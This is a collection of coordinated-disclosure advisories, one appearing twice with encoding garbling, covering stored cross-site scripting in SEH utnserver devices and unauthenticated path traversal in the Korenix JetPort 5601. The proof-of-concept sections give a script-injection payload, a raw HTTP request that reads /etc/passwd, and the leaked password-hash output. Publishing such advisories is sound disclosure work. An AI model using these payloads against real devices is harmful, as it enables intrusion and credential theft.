                   by| P. Riedl, J. Springer, P. Chistè, D. Sagl, S. Vogt
                     | These vulnerabilities were discovery during research at
                     | St.Pölten UAS, supported and coordinated by CyberDanube.

Vendor description
-------------------------------------------------------------------------------
"We are SEH from Bielefeld - manufacturer of high-quality network solutions.
With over 35 years of experience in the fields of printing and networks, we
offer our customers a broad and high-level expertise in solutions for all types
of business environments."

Vulnerable versions
-------------------------------------------------------------------------------
utnserver Pro / 20.1.22
utnserver ProMAX / 20.1.22
INU-100 / 20.1.22

Vulnerability overview
-------------------------------------------------------------------------------
1) Multiple Stored Cross-Site Scripting (CVE-2024-11304)
Different settings on the web interface of the device can be abused to store
JavaScript code and execute it in the context of a user's browser.

Proof of Concept
-------------------------------------------------------------------------------
1) Multiple Stored Cross-Site Scripting (CVE-2024-11304)
The following snippet can be used to demonstrate, that stored cross-site
scripting is possible in multiple locations on the device:
"><script>alert(document.location)</script>

Examples are:
 * Users password: "usrMg_pwd"
   This can be displayed in cleartext and executed in the device configuration.
 * Certificate options: "Common name", "Organization name", "Locality name"
   This can be executed in the certificate information.
 * Device description: "Host name", "Contact person", "Description"
   This can be executed in "Device -> Description".
 * USB password via uploading a crafted "_parameters.txt" file: "usbMdg_pwd"
   This can be executed in the "Maintenance -> Content View" tab.

Saving this text to the device description leads to a persistent cross-site
scripting. Therefore, everyone who openes the device description executes the
injected code in the context of the own browser.

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (<https://medusa.cyberdanube.com>).

Solution
-------------------------------------------------------------------------------
Install firmware version 20.1.35 to fix the vulnerabilities.

Workaround
-------------------------------------------------------------------------------
None

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends SEH Computertechnik customers to upgrade the firmware to
the latest version available.

Contact Timeline
-------------------------------------------------------------------------------
2024-09-23: Contacting SEH Computertechnik and sent advisory to support.
            Support answered, that vulnerabilities are fixed in version
            20.1.35.
2024-10-21: Closed the issue and scheduled publication for November.
2024-11-18: Coordinated disclosure of advisory.

# St. PÃ¶lten UAS | Path Traversal in Korenix JetPort

The Korenix JetPort 5601 device is prone to a path traversal vulnerability. This allows an attacker to retrieve system files including password hashes and configuration.

## Vendor description

âKorenix Technology, a Beijer group company within the Industrial Communication business area, is a global leading manufacturer providing innovative, market-oriented, value-focused Industrial Wired and Wireless Networking Solutions. With decades of experiences in the industry, we have developed various product lines [â¦].

Our products are mainly applied in SMART industries: Surveillance, Machine-to-Machine, Automation, Remote Monitoring, and Transportation. Worldwide customer base covers different Sales channels, including end-customers, OEMs, system integrators, and brand label partners. [â¦]â

Source: https://www.korenix.com/en/about/index.aspx?kind=3

### Vulnerable versions

Korenix JetPort 5601v3 / v1.2

#### Vulnerability overview

1) Path Traversal (CVE-2024-11303)

A path traversal attack for unauthenticated users is possible. This allows getting access to the operating system of the device and access information like configuration files and connections to other hosts or potentially other sensitive information.

#### Proof of Concept

##### 1) Path Traversal (CVE-2024-11303)

By sending the following request to the following endpoint, a path traversal vulnerability can be triggered:

```
GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.69.10.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Te: trailers
Connection: keep-alive
```

Note, that this is only possible when an interceptor proxy or a command line tool is used. A web browser would encode the characters and the path traversal would not work.

The response to the latter request is shown below:

```
HTTP/1.1 200 OK
Server: thttpd/2.19-MX Jun 2 2022
Content-type: text/plain; charset=iso-8859-1
[â¦]
Accept-Ranges: bytes
Connection: Keep-Alive
Content-length: 86
root::0:0:root:/root:/bin/false
admin:$1$$CoERg7ynjYLsj2j4glJ34.:502:502::/:/bin/true
```

The vulnerabilities were manually verified on an emulated device by using the MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

#### Solution

None. Device is End-of-Life.

#### Workaround

Limit the access to the device and place it within a segmented network.

#### Recommendation

CyberDanube recommends Korenix customers to upgrade to another device.

---

#### Contact Timeline

* 2024-09-23: Contacting Beijer Electronics Group viaÂ cs@beijerelectronics.com.
* 2024-09-24: Vendor stated, that the device is end-of-life. Contact will ask the engineering team if there are any changes.
* 2024-10-15: Vendor stated, that the advisory can be published. No further updates are planned for this device.
* 2024-11-18: Coordinated disclosure of advisory.

# St. PÃ¶lten UAS | Stored Cross-Site Scripting in SEH utnserver Pro

The untserver Pro ist prone to stored cross-site scripting. This allows an attacker to place malicious code in the web interface of the untserver.

## Vendor description

âWe are SEH from Bielefeld â manufacturer of high-quality network solutions. With over 35 years of experience in the fields of printing and networks, we offer our customers a broad and high-level expertise in solutions for all types of business environments.â

Source: https://www.seh-technology.com/us/company/about-us.html

### Vulnerable versions

utnserver Pro / 20.1.22

utnserver ProMAX / 20.1.22

INU-100 / 20.1.22

#### Vulnerability overview

1) Multiple Stored Cross-Site Scripting (CVE-2024-11304)

Different settings on the web interface of the device can be abused to store JavaScript code and execute it in the context of a userâs browser.

#### Proof of Concept

##### 1) Multiple Stored Cross-Site Scripting (CVE-2024-11304)

The following snippet can be used to demonstrate, that stored cross-site scripting is possible in multiple locations on the device:

```
â><script>alert(document.location)</script>
```

Examples are:

* Users password: âusrMg\_pwdâ

  This can be displayed in cleartext and executed in the device configuration.
* Certificate options: âCommon nameâ, âOrganization nameâ, âLocality nameâ

  This can be executed in the certificate information.
* Device description: âHost nameâ, âContact personâ, âDescriptionâ

  This can be executed in âDevice -> Descriptionâ.
* USB password via uploading a crafted â\_parameters.txtâ file: âusbMdg\_pwdâ

  This can be executed in the âMaintenance -> Content Viewâ tab.

Saving this text to the device description leads to a persistent cross-site scripting. Therefore, everyone who openes the device description executes the injected code in the context of the own browser.

The vulnerabilities were manually verified on an emulated device by using the MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

#### Solution

Install firmware version 20.1.35 to fix the vulnerabilities.

#### Workaround

None

#### Recommendation

CyberDanube recommends SEH Computertechnik customers to upgrade the firmware to the latest version available.

---

#### Contact Timeline

* 2024-09-23: Contacting SEH Computertechnik and sent advisory to support. Support answered, that vulnerabilities are fixed in version 20.1.35.
* 2024-10-21: Closed the issue and scheduled publication for November.
* 2024-11-18: Coordinated disclosure of advisory.
